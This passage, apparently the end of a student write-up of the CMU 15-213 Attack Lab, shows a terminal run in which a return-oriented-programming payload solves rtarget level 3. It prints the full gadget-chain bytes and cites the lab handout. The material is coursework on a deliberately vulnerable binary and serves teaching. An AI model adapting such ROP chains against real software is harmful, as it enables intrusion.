ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ ./rtarget -q -i <(./hex2raw < rtarget.l5.txt)
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AD 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 CC 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 70 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61
```

ALL OVER

## REF
1. https://csapp.cs.cmu.edu/3e/attacklab.pdf
2. https://zhuanlan.zhihu.com/p/476396465